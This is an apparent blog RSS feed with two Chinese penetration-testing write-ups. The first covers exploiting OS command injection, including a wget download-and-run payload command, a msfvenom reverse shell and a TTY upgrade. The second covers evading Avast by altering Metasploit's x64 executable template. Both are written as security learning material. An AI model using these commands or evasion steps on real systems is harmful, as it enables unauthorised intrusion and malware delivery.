<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Metasploit on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/metasploit/</link>
        <description>Recent content in Metasploit on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Wed, 06 Aug 2025 10:01:27 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/metasploit/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>OS命令注入实战：从挫折到获取Shell的完整历程</title>
        <link>http://localhost:1313/p/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E4%BB%8E%E6%8C%AB%E6%8A%98%E5%88%B0%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%AE%8C%E6%95%B4%E5%8E%86%E7%A8%8B/</link>
        <pubDate>Wed, 06 Aug 2025 10:01:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E4%BB%8E%E6%8C%AB%E6%8A%98%E5%88%B0%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%AE%8C%E6%95%B4%E5%8E%86%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;os命令注入实战从挫折到获取shell的完整历程&#34;&gt;OS命令注入实战：从挫折到获取Shell的完整历程
&lt;/h1&gt;&lt;p&gt;Carrie Roberts //&lt;/p&gt;
&lt;p&gt;OS命令注入非常有趣。最近我在测试某个Web应用时发现了这个漏洞（感谢Burp Suite扫描器）。虽然预感到即将获得shell，但实际过程却比预期困难得多。以下是我的探索历程和技术收获。&lt;/p&gt;
&lt;h2 id=&#34;初始发现&#34;&gt;初始发现
&lt;/h2&gt;&lt;p&gt;已知目标运行在Red Hat Linux的Apache服务器上。通过以下注入成功触发外部服务器(1.2.3.4)的ICMP响应，分号用于分隔原始命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;ping -c &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 1.2.3.4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;使用tcpdump验证请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nni eth0 icmp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;遇到的障碍&#34;&gt;遇到的障碍
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;32字符长度限制&lt;/strong&gt;：通过反复测试发现命令被截断，推测因数据库存储限制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;非常规响应机制&lt;/strong&gt;：&lt;code&gt;/etc/passwd&lt;/code&gt;内容意外出现在响应头而非响应体&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;环境限制&lt;/strong&gt;：无netcat可用，但发现Python环境&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;关键技术突破&#34;&gt;关键技术突破
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;响应头注入技巧&lt;/strong&gt;：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n s:&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;which python  &lt;span class=&#34;c1&#34;&gt;# 输出会附加到响应头&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;Python反弹shell&lt;/strong&gt;：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;使用msfvenom生成payload&lt;/li&gt;
&lt;li&gt;必须禁用stage编码：&lt;code&gt;set EnableStageEncoding false&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;通过wget传输payload：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget &lt;span class=&#34;s2&#34;&gt;&amp;#34;myserver.net&amp;#34;&lt;/span&gt; -O ~/z
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python ~/z
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;TTY升级&lt;/strong&gt;：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;注意非常规输出渠道（如HTTP头）&lt;/li&gt;
&lt;li&gt;长度限制下需精简命令&lt;/li&gt;
&lt;li&gt;Python是受限环境中的利器&lt;/li&gt;
&lt;li&gt;真实环境往往比理论更复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;这就是黑客攻防的本质——看似简单的漏洞，实战中总会遇到意想不到的挑战。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>修改Metasploit x64模板实现反病毒规避技术</title>
        <link>http://localhost:1313/p/%E4%BF%AE%E6%94%B9metasploit-x64%E6%A8%A1%E6%9D%BF%E5%AE%9E%E7%8E%B0%E5%8F%8D%E7%97%85%E6%AF%92%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Tue, 05 Aug 2025 23:18:51 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BF%AE%E6%94%B9metasploit-x64%E6%A8%A1%E6%9D%BF%E5%AE%9E%E7%8E%B0%E5%8F%8D%E7%97%85%E6%AF%92%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;修改metasploit-x64模板实现反病毒规避&#34;&gt;修改Metasploit x64模板实现反病毒规避
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Joff Thyer&lt;/strong&gt;&lt;br&gt;
&lt;em&gt;注意：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;在针对Windows桌面的渗透测试中，测试人员常使用Veil&amp;rsquo;s Powershell Empire等工具将shellcode直接注入内存。这种技术能有效规避磁盘写入和端点防护软件的检测。但有时我们需要使用实际恶意软件可执行文件进行更全面的测试，以评估防御技术的检测阈值。&lt;/p&gt;
&lt;h2 id=&#34;现状分析&#34;&gt;现状分析
&lt;/h2&gt;&lt;p&gt;反病毒引擎对Metasploit框架生成的32位恶意软件检测效果显著，但对64位变种检测能力较弱。研究发现，AV引擎不仅检测shellcode，还会匹配msfvenom生成的可执行文件中存根加载器的汇编代码特征。&lt;/p&gt;
&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
&lt;/h2&gt;&lt;p&gt;Metasploit生成payload时使用预编译的模板可执行文件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;32位模板：C语言源码（位于&lt;code&gt;/usr/share/metasploit-framework/data/templates/src/pe/exe&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;64位模板：汇编语言源码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;模板功能均为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;分配4096字节内存缓冲区&lt;/li&gt;
&lt;li&gt;写入&amp;quot;PAYLOAD:&amp;ldquo;标记字符串&lt;/li&gt;
&lt;li&gt;msfvenom将选定payload（经编码处理后）注入该缓冲区&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验过程&#34;&gt;实验过程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;原始模板测试&lt;/strong&gt;：Avast立即触发警报（基于汇编指令特征匹配）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓冲区扩容测试&lt;/strong&gt;：将缓冲区改为8192字节后，Avast完全漏报&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;完整修改测试&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;修改全部汇编代码数值为8192&lt;/li&gt;
&lt;li&gt;生成两种payload（含XOR编码/无编码）&lt;/li&gt;
&lt;li&gt;成功绕过Avast的&amp;quot;深度扫描&amp;quot;并获取shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术验证&#34;&gt;技术验证
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;修改后的&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x64汇编代码片段&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8192&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;字节缓冲区）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rcx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8192&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload_start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rcx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8192&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;rep&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;movsb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;实验证实AV厂商主要检测模板特征而非shellcode本身。仅通过简单修改汇编代码（如调整缓冲区大小）即可有效绕过64位payload检测。该方法对其他AV引擎的适用性有待进一步验证。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提示：完整技术细节和编译说明请参考原文中的汇编源码注释。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
